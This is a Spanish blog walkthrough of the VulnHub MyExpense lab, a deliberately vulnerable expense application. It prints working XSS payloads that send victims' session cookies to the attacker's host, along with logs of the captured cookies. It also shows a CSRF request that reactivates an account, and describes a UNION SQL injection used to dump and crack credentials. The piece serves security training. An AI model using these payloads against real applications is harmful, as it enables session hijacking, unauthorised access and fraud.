---
title: VH - MyExpenses
published: true
categories: [Linux]
tags: [eWPT, eWPTXv2, OSWE, Media]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina `MyExpenses` de dificultad "Media" de la plataforma [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/).

Técnicas Vistas: 

- **Web Enumeration**
- **Enabling disabled button in the user registration form**
- **XSS (Cross-Site Scripting)**
- **CSRF (Cross-Site Request Forgery)**
- **XSS + Javascript file in order to steal the user's session cookie**
- **XSS + CSRF in order to activate new registered users**
- **XSS vulnerability in message management system**
- **Stealing session cookies with XSS vulnerability in message handling system**
- **Cookie Hijacking**
- **SQL Injection (Union Query Based)**
- **Cracking Hashes**

### Descripción

* * *

MyExpense es una aplicación web deliberadamente vulnerable que le permite entrenarse en la detección y explotación de diferentes vulnerabilidades web. A diferencia de una aplicación de "desafío" más tradicional (que le permite entrenar en una sola vulnerabilidad específica), MyExpense contiene un conjunto de vulnerabilidades que necesita explotar para lograr el escenario completo.

### Escenario

* * *

Usted es "Samuel Lamotte" y acaba de ser despedido de su empresa "Futura Business Informatique". Desafortunadamente, debido a su salida apresurada, no tuvo tiempo de validar su informe de gastos de su último viaje de negocios, que aún asciende a 750 € correspondientes a un vuelo de regreso a su último cliente.

Por temor a que su antiguo jefe no quiera reembolsarle este informe de gastos, decide 'hackear' la aplicación interna llamada "MyExpense" para administrar los informes de gastos de los empleados.

Así que estás en tu coche, en el aparcamiento de la empresa y conectado a la red Wi-Fi interna (la contraseña aún no ha sido cambiada después de tu salida). La aplicación está protegida por autenticación de usuario/contraseña y espera que el administrador aún no haya modificado o eliminado su acceso.

Sus credenciales eran: `samuel/fzghn4lw`

Una vez realizado el desafío, la flag se mostrará en la aplicación mientras se conecta con su cuenta (samuel).

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `MyExpenses`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.129	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.131	d8:a3:5c:73:eb:02	(Unknown)
192.168.1.135	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.144	00:0c:29:fb:e4:8b	VMware, Inc.
192.168.1.138	00:55:da:56:56:66	IEEE Registration Authority
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.144`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 192.168.1.144
PING 192.168.1.144 (192.168.1.144) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=42.3 ms

--- 192.168.1.144 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.144 -oG allPorts

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
35103/tcp open  unknown syn-ack ttl 64
38011/tcp open  unknown syn-ack ttl 64
50117/tcp open  unknown syn-ack ttl 64
57271/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:FB:E4:8B (VMware)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80,33043,34921,52847,53873 192.168.1.144 -oN targeted

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
33043/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
34921/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
52847/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
53873/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
MAC Address: 00:0C:29:FB:E4:8B (VMware)
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.144
http://192.168.1.144 [200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.144], Title[Futura Business Informatique GROUPE - Conseil en ingénierie]
```

Accedemos al servicio HTTP por el puerto 80 y observamos la página principal de la aplicación MyExpense 

<img src="/assets/VH/MyExpenses/web.png">

Observamos en los resultados del escaneo con nmap que existe un archivo `robots.txt` el cual nos revela la ruta `/admin/admin.php`

<img src="/assets/VH/MyExpenses/admin.png">

Vemos una lista de todos nuestros ex-compañeros de trabajo y al parecer nos han desactivado la cuenta. Si tratamos de loguearnos con nuestras credenciales confirmamos que no podemos acceder. Tendremos que buscar vías 'alternativas'

<img src="/assets/VH/MyExpenses/login.png">

Tratamos de dar de alta un nuevo usuario pero parece ser que la aplicación de registro es sólo de uso interno y el botón de `Sign up !` está deshabilitado. Inspeccionamos el código HTML vemos que la etiqueta del botón tiene el atributo `disabled`, borramos la etiqueta y ya tenemos el botón funcional

<img src="/assets/VH/MyExpenses/signup.png">

En este punto procedemos a registrar un nuevo usuario. Como vimos en el panel de admin los campos del formulario de registro se muestran en el listado de empleados. Comprobamos si es vulnerable a XSS

<img src="/assets/VH/MyExpenses/xss.png">

Accedemos nuevamente al panel de admin e inmediatamente nos salta el alert que hemos insertado

<img src="/assets/VH/MyExpenses/pocxss.png">

Si tratamos de activar nuestra cuenta de nuevo el sistema verifica que no tenemos privilegios para esta acción

<img src="/assets/VH/MyExpenses/inactive.png">

En este punto crearemos un nuevo usuario insertando una etiqueta `script` la cual apunte a un recurso de nuestro equipo y comprobaremos si hay algún usuario que acceda al panel de admin. Levantamos un servidor http con python y esperamos a ver que pasa...

<img src="/assets/VH/MyExpenses/random.png">

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.144 - - [09/Feb/2023 10:58:42] code 404, message File not found
192.168.1.144 - - [09/Feb/2023 10:58:42] "GET /pwned.js HTTP/1.1" 404 -
```

Ojo! parece que algún usuario ha accedido al panel de admin. En este punto vamos a crear un recurso `pwned.js` en el cual insertaremos código JavaScript para acontecer un ataque de Cookie Hijacking. Creamos archivo y lo servimos mediante servidor http

```js
❯ cat pwned.js
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.js
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ var request = new XMLHttpRequest();
   2   │ request.open('GET', 'http://192.168.1.148/?pwned.js=' + document.cookie);
   3   │ request.send();
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.144 - - [09/Feb/2023 11:02:13] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:02:13] "GET /?pwned.js=PHPSESSID=g4ofn98l2pbg4e44jus7u1he50 HTTP/1.1" 200 -
```

Hemos conseguido la cookie de sesión del usuario admin. Abrimos panel de admin y sustituimos nuestra cookie por la obtenida para tratar de activar nuestra cuenta. Vaya, parece que el sistema no permite dos sesiones de admin con la misma cookie

<img src="/assets/VH/MyExpenses/error.png">

Sabiendo que el usuario admin vista regularmente el panel de admin modificamos el archivo `pwned.js` para que cuando el admin visite la páqina cargue una petición por GET al recurso para activar la cuenta suspendida

```js
❯ cat pwned.js
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.js
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ var request = new XMLHttpRequest();
   2   │ request.open('GET', 'http://192.168.1.144/admin/admin.php?id=11&status=active');
   3   │ request.send();
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.148 - - [09/Feb/2023 11:23:02] "GET /pwned.js HTTP/1.1" 200 -
```

Observamos que se ha jecutado la petición, recargamos la web y confirmamos que tenemos la cuenta de Samuel nuevamente activa. Se acaba de acontecer un `CSRF`

<img src="/assets/VH/MyExpenses/cuentaactivada.png">

Accedemos a nuestra cuenta y vemos en la pestaña de `Expense Reports` nuestro informe de gastos pendiente de enviar. hacemos click en el botón de submit 

<img src="/assets/VH/MyExpenses/expense.png">
<img src="/assets/VH/MyExpenses/send.png">

Vemos que se ha enviado pero está pendiente de aprobación. En los detalles de nuestro perfil vemos que nuestro manager es `Manon Riviere` el cual tendrá el informde de gastos pendiente de autorizar

<img src="/assets/VH/MyExpenses/manager.png">

En la página principal de nuestro perfil vemos que hay un sistema de mensajes para empleados. Asumiendo que la web es vulnerable a XSS y que a éste sistema de mensajes acceden varios usuarios entre ellos nuestro manager trataremos de obtener sus cookies de sesión de la misma forma que hicimos anteriormente

<img src="/assets/VH/MyExpenses/mensaje.png">

```js
❯ cat pwned.js
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.js
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ var request = new XMLHttpRequest();
   2   │ request.open('GET', 'http://192.168.1.148:4646/?hacked=' + document.cookie);
   3   │ request.send();
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
❯ python3 -m http.server 4646
Serving HTTP on 0.0.0.0 port 4646 (http://0.0.0.0:4646/) ...

192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /?hacked=PHPSESSID=fjfh8soap2slbhbihlaut1hbb3 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /?hacked=PHPSESSID=11jvn87cpnqu3kpr5meqrhjlp3 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /?hacked=PHPSESSID=11jvn87cpnqu3kpr5meqrhjlp3 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:33] "GET /?hacked=PHPSESSID=fjfh8soap2slbhbihlaut1hbb3 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:47] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:39:47] "GET /?hacked=PHPSESSID=g4ofn98l2pbg4e44jus7u1he50 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:42:27] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:42:27] "GET /?hacked=PHPSESSID=kb73a75rbk1n4dtfln2nb4l686 HTTP/1.1" 200 -
192.168.1.144 - - [09/Feb/2023 11:42:27] "GET /?hacked=PHPSESSID=kb73a75rbk1n4dtfln2nb4l686 HTTP/1.1" 200 -
```

Hemos capturado las cookies de varios usuarios, probamos y vemos que la cookie `kb73a75rbk1n4dtfln2nb4l686` pertenece a nuestro manager Manon Riviere. Accedemos a Expense Reports y vemos nuestro reporte pendiente de aprobar, por supuesto lo autorizamos rápidmente

<img src="/assets/VH/MyExpenses/newreport.png">

Aún no está todo hecho. Ahora el informe de gastos está pendiente de autorizar por `Paul Baudouin` que es el `Financial approver` pero incialmente este usuario no está muy activo y no podemos capturar su cookie, tendremos que buscar otras vías alternativas

El perfil de Manon tiene una pestaña `Rennes` que no teníamos en nuestro perfil. Accedemos e inspeccionando la composición de la url nos lleva a pensar en SQLI

<img src="/assets/VH/MyExpenses/rennes.png">

Probamos varios payloads y confirmamos por la respuesta que es vulnerable a SQLI

<img src="/assets/VH/MyExpenses/sqli.png">

Tratando de aplicar un ordenamiento por columnas averiguamos que tiene 2. Conseguimos mostrar la base de datos en uso confirmado que tenemos SQLI Union

<img src="/assets/VH/MyExpenses/union.png">

A partir de aquí tratamos de dumpear datos de la base de datos `myexpense`

<img src="/assets/VH/MyExpenses/dbdump.png">
<img src="/assets/VH/MyExpenses/tabledump.png">
<img src="/assets/VH/MyExpenses/columndump.png">
<img src="/assets/VH/MyExpenses/credentials.png">

hemos conseguido las credenciales de todos los usuarios. Como están hasheadas en MD5 tratamos de crackearla en la página [CrackStation](https://crackstation.net/)

<img src="/assets/VH/MyExpenses/crack.png">

Accedemos al perfil de `Paul Baudouin` y autorizamos nuestro informe de gastos

<img src="/assets/VH/MyExpenses/aprobado.png">

Confirmamos en nuestro perfil que se ha enviado para pago

<img src="/assets/VH/MyExpenses/pwned.png">

Hemos completado la máquina **MyExpenses** de VulnHub!! Happy Hacking!!
